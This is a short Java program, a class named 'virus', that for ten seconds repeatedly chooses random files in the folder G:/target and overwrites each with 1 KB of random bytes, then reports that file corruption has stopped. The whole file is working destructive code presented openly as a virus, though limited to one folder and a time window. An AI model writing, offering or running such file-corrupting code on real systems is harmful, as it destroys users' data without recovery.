import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.Random;

public class virus {
    public static void main(String[] args) throws IOException {
        File directory = new File("G:/target"); // Target folder on G drive
        Random random = new Random();
        long startTime = System.currentTimeMillis(); // Track start time

        while (System.currentTimeMillis() - startTime < 10000) { // Stop after 10 seconds
            File[] files = directory.listFiles();
            if (files != null && files.length > 0) {
                File target = files[random.nextInt(files.length)]; // Select a random file in the "target" folder
                try (FileOutputStream fos = new FileOutputStream(target)) {
                    byte[] junkData = new byte[1024]; // 1 KB of random junk data
                    random.nextBytes(junkData); // Generate random data
                    fos.write(junkData); // Write data to corrupt the file
                }
            }
        }

        System.out.println("File corruption stopped after 10 seconds.");
    }
}
